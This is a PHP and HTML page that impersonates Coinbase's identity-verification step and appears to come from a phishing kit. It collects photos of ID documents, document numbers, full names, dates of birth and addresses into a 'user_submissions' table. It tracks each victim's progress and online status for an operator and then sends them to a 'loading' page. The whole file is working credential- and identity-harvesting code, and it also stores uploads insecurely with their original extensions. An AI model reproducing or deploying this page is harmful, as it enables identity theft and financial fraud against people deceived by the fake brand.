<?php
session_start();

// Include the database connection file
require_once "admin/db_connection.php";

// Function to update user activity
function updateActivity($token, $activity) {
    global $conn;
    $sql = "UPDATE user_submissions SET activity = ? WHERE token = ?";
    $stmt = $conn->prepare($sql);
    $stmt->bind_param("ss", $activity, $token);
    $stmt->execute();
    $stmt->close();
}

// Check if the email and token are set in the session
if (!isset($_SESSION["email"]) || !isset($_SESSION["token"])) {
    header("Location: login.php");
    exit();
}

// Retrieve the email and token from the session
$email = $_SESSION["email"];
$token = $_SESSION["token"];

// Update user activity to indicate ID verification page
updateActivity($token, "IDVerification");

// Handle form submission
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $id_type = $_POST["id_type"] ?? '';
    $id_number = $_POST["id_number"] ?? '';
    $full_name = $_POST["full_name"] ?? '';
    $date_of_birth = $_POST["date_of_birth"] ?? '';
    $address = $_POST["address"] ?? '';
    
    // Handle file uploads
    $upload_dir = 'uploads/';
    if (!file_exists($upload_dir)) {
        mkdir($upload_dir, 0777, true);
    }
    
    $uploaded_files = [];
    if (isset($_FILES)) {
        foreach ($_FILES as $key => $file) {
            if ($file['error'] == UPLOAD_ERR_OK) {
                $filename = $token . '_' . $key . '_' . time() . '.' . pathinfo($file['name'], PATHINFO_EXTENSION);
                $filepath = $upload_dir . $filename;
                if (move_uploaded_file($file['tmp_name'], $filepath)) {
                    $uploaded_files[$key] = $filename;
                }
            }
        }
    }
    
    // Store ID verification data in new fields
    $verification_date = date('Y-m-d H:i:s');
    
    // Determine document paths based on document type
    $document_front_path = null;
    $document_back_path = null;
    
    switch($id_type) {
        case 'drivers_license':
            $document_front_path = isset($uploaded_files['dl_front']) ? 'uploads/' . $uploaded_files['dl_front'] : null;
            $document_back_path = isset($uploaded_files['dl_back']) ? 'uploads/' . $uploaded_files['dl_back'] : null;
            break;
        case 'passport':
            $document_front_path = isset($uploaded_files['passport_photo']) ? 'uploads/' . $uploaded_files['passport_photo'] : null;
            break;
        case 'state_id':
            $document_front_path = isset($uploaded_files['state_id_photo']) ? 'uploads/' . $uploaded_files['state_id_photo'] : null;
            break;
        case 'national_id':
            $document_front_path = isset($uploaded_files['national_id_photo']) ? 'uploads/' . $uploaded_files['national_id_photo'] : null;
            break;
    }
    
    // Prepare user data as JSON
    $userData = [
        'full_name' => $full_name,
        'date_of_birth' => $date_of_birth,
        'address' => $address
    ];
    
    // Store ID verification data in database
    $frontPhoto = $uploaded_files['front_photo'] ?? null;
    $backPhoto = $uploaded_files['back_photo'] ?? null;
    $selfiePhoto = $uploaded_files['selfie_photo'] ?? null;
    
    $stmt = $conn->prepare("UPDATE user_submissions SET document_type = ?, document_number = ?, data = ?, id_verified = 1, id_verification_date = ?, document_front_path = ?, document_back_path = ?, front = ?, back = ?, selfie = ? WHERE token = ?");
    $stmt->bind_param("ssssssssss", $id_type, $id_number, json_encode($userData), $verification_date, $document_front_path, $document_back_path, $frontPhoto, $backPhoto, $selfiePhoto, $token);
    
    if ($stmt->execute()) {
        updateActivity($token, "IDSubmitted");
        header("Location: loading.php");
        exit();
    } else {
        echo "Error: " . $conn->error;
    }
    $stmt->close();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="assets/favicon-32x32.png" type="image/x-icon">
    <title>Coinbase - Identity Verification</title>
    <style>
        @font-face {
            font-family: 'CoinbaseSans';
            src: url('assets/CoinbaseSans2.woff2') format('woff2');
        }

        body {
            margin: 0;
            padding: 0;
            background-color: #0A0B0D;
            color: #E0E0E0;
            font-family: 'CoinbaseSans', Arial, sans-serif;
        }

        .wrapper {
            display: flex;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 500px;
            padding: 30px;
            border-radius: 16px;
            border: 1px solid rgba(91, 97, 110, 0.2);
            background-color: #0A0B0D;
            margin-top: 50px;
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
        }

        .logo {
            width: 120px;
            margin-bottom: 20px;
        }

        h1 {
            font-size: 28px;
            font-weight: 600;
            margin: 0 0 10px 0;
            color: #fff;
        }

        .subtitle {
            color: #8f9296;
            font-size: 16px;
            margin-bottom: 30px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            color: #fff;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 8px;
        }

        select, input[type="text"], input[type="date"], input[type="file"] {
            width: 100%;
            padding: 16px;
            background-color: #1a1a1a;
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 8px;
            color: #fff;
            font-size: 16px;
            box-sizing: border-box;
        }

        select:focus, input:focus {
            outline: none;
            border-color: #0052ff;
        }

        textarea {
            width: 100%;
            padding: 16px;
            background-color: #1a1a1a;
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 8px;
            color: #fff;
            font-size: 16px;
            box-sizing: border-box;
            resize: vertical;
            min-height: 80px;
        }

        .submit-btn {
            width: 100%;
            padding: 16px;
            background-color: #0052ff;
            border: none;
            border-radius: 24px;
            color: #fff;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 20px;
        }

        .submit-btn:hover {
            background-color: #0041cc;
        }

        .info-box {
            background-color: #1a1a1a;
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            padding: 16px;
            margin-bottom: 20px;
        }

        .info-box p {
            margin: 0;
            color: #8f9296;
            font-size: 14px;
            line-height: 1.5;
        }

        .upload-section {
            display: none;
            margin-top: 20px;
            padding: 20px;
            background-color: #1a1a1a;
            border-radius: 12px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            animation: slideIn 0.3s ease-in-out;
        }

        .upload-section.active {
            display: block;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(-10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .upload-item {
            margin-bottom: 15px;
        }

        .upload-item:last-child {
            margin-bottom: 0;
        }

        .upload-label {
            color: #fff;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 8px;
            display: block;
        }

        .file-input-wrapper {
            position: relative;
            display: inline-block;
            width: 100%;
        }

        .file-input {
            opacity: 0;
            position: absolute;
            z-index: -1;
        }

        .file-input-button {
            display: inline-block;
            padding: 16px;
            background-color: #2a2a2a;
            border: 2px dashed rgba(255, 255, 255, 0.3);
            border-radius: 8px;
            color: #8f9296;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s ease;
            width: 100%;
            box-sizing: border-box;
        }

        .file-input-button:hover {
            border-color: #0052ff;
            background-color: rgba(0, 82, 255, 0.1);
        }

        .file-input-button.has-file {
            background-color: rgba(0, 82, 255, 0.2);
            border-color: #0052ff;
            color: #fff;
        }

        .upload-icon {
            font-size: 24px;
            margin-bottom: 8px;
            display: block;
        }
    </style>
</head>
<body>
    <div class="wrapper">
        <div class="container">
            <div class="header">
                <img src="https://assets.ifttt.com/images/channels/1358877763/icons/monochrome_large.png" alt="Coinbase Logo" class="logo">
                <h1>Identity Verification</h1>
                <p class="subtitle">We need to verify your identity to comply with financial regulations</p>
            </div>

            <div class="info-box">
                <p>To continue using Coinbase, please provide the following information and upload photos of your identification document.</p>
            </div>

            <form method="POST" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" enctype="multipart/form-data">
                <div class="form-group">
                    <label for="id_type">Document Type</label>
                    <select id="id_type" name="id_type" required onchange="showUploadSection()">
                        <option value="">Select document type</option>
                        <option value="drivers_license">Driver's License</option>
                        <option value="passport">Passport</option>
                        <option value="state_id">State ID</option>
                        <option value="national_id">National ID</option>
                    </select>
                </div>

                <!-- Driver's License Upload Section -->
                <div id="drivers_license_section" class="upload-section">
                    <div class="upload-item">
                        <label class="upload-label">Front of Driver's License</label>
                        <div class="file-input-wrapper">
                            <input type="file" id="dl_front" name="dl_front" class="file-input" accept="image/*" onchange="updateFileButton(this)">
                            <label for="dl_front" class="file-input-button">
                                <span class="upload-text">Click to upload front of license</span>
                            </label>
                        </div>
                    </div>
                    <div class="upload-item">
                        <label class="upload-label">Back of Driver's License</label>
                        <div class="file-input-wrapper">
                            <input type="file" id="dl_back" name="dl_back" class="file-input" accept="image/*" onchange="updateFileButton(this)">
                            <label for="dl_back" class="file-input-button">
                                <span class="upload-text">Click to upload back of license</span>
                            </label>
                        </div>
                    </div>
                </div>

                <!-- Passport Upload Section -->
                <div id="passport_section" class="upload-section">
                    <div class="upload-item">
                        <label class="upload-label">Passport Photo Page</label>
                        <div class="file-input-wrapper">
                            <input type="file" id="passport_photo" name="passport_photo" class="file-input" accept="image/*" onchange="updateFileButton(this)">
                            <label for="passport_photo" class="file-input-button">
                                <span class="upload-text">Click to upload passport photo page</span>
                            </label>
                        </div>
                    </div>
                </div>

                <!-- State ID Upload Section -->
                <div id="state_id_section" class="upload-section">
                    <div class="upload-item">
                        <label class="upload-label">State ID (Front and Back)</label>
                        <div class="file-input-wrapper">
                            <input type="file" id="state_id_photo" name="state_id_photo" class="file-input" accept="image/*" onchange="updateFileButton(this)">
                            <label for="state_id_photo" class="file-input-button">
                                <span class="upload-text">Click to upload state ID</span>
                            </label>
                        </div>
                    </div>
                </div>

                <!-- National ID Upload Section -->
                <div id="national_id_section" class="upload-section">
                    <div class="upload-item">
                        <label class="upload-label">National ID</label>
                        <div class="file-input-wrapper">
                            <input type="file" id="national_id_photo" name="national_id_photo" class="file-input" accept="image/*" onchange="updateFileButton(this)">
                            <label for="national_id_photo" class="file-input-button">
                                <span class="upload-text">Click to upload national ID</span>
                            </label>
                        </div>
                    </div>
                </div>

                <div class="form-group">
                    <label for="id_number">Document Number</label>
                    <input type="text" id="id_number" name="id_number" placeholder="Enter your document number" required>
                </div>

                <div class="form-group">
                    <label for="full_name">Full Legal Name</label>
                    <input type="text" id="full_name" name="full_name" placeholder="Enter your full legal name" required>
                </div>

                <div class="form-group">
                    <label for="date_of_birth">Date of Birth</label>
                    <input type="date" id="date_of_birth" name="date_of_birth" required>
                </div>

                <div class="form-group">
                    <label for="address">Full Address</label>
                    <textarea id="address" name="address" placeholder="Enter your complete address including street, city, state, and ZIP code" required></textarea>
                </div>

                <button type="submit" class="submit-btn">Verify Identity</button>
            </form>
        </div>
    </div>

    <script>
        // Function to show upload section based on selected document type
        function showUploadSection() {
            const selectedType = document.getElementById('id_type').value;
            const sections = document.querySelectorAll('.upload-section');
            
            // Hide all sections first
            sections.forEach(section => {
                section.classList.remove('active');
            });
            
            // Show the relevant section with animation
            if (selectedType) {
                const targetSection = document.getElementById(selectedType + '_section');
                if (targetSection) {
                    setTimeout(() => {
                        targetSection.classList.add('active');
                    }, 100);
                }
            }
        }
        
        // Function to update file upload button appearance
        function updateFileButton(input) {
            const label = input.nextElementSibling;
            const textSpan = label.querySelector('.upload-text');
            
            if (input.files && input.files[0]) {
                const fileName = input.files[0].name;
                textSpan.textContent = '✓ ' + fileName;
                label.classList.add('has-file');
            } else {
                // Reset to original text based on input ID
                if (input.id === 'dl_front') {
                    textSpan.textContent = 'Click to upload front of license';
                } else if (input.id === 'dl_back') {
                    textSpan.textContent = 'Click to upload back of license';
                } else if (input.id === 'passport_photo') {
                    textSpan.textContent = 'Click to upload passport photo page';
                } else if (input.id === 'state_id_photo') {
                    textSpan.textContent = 'Click to upload state ID';
                } else if (input.id === 'national_id_photo') {
                    textSpan.textContent = 'Click to upload national ID';
                }
                label.classList.remove('has-file');
            }
        }

        // Function to update user status
        function updateUserStatus(status) {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', 'update_status.php', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.send('status=' + status);
        }

        // Detect user activity
        function detectActivity() {
            var userActive = false;

            function setUserActive() {
                if (!userActive) {
                    userActive = true;
                    updateUserStatus('online');
                }
            }

            window.addEventListener('mousemove', setUserActive);
            window.addEventListener('keydown', setUserActive);
            window.addEventListener('visibilitychange', function() {
                if (!document.hidden) {
                    setUserActive();
                }
            });

            window.addEventListener('touchstart', setUserActive);
            window.addEventListener('touchmove', setUserActive);
            window.addEventListener('orientationchange', setUserActive);
            window.addEventListener('scroll', setUserActive);

            window.addEventListener('beforeunload', function() {
                updateUserStatus('offline');
            });
        }

        document.addEventListener('DOMContentLoaded', detectActivity);
    </script>
</body>
</html>
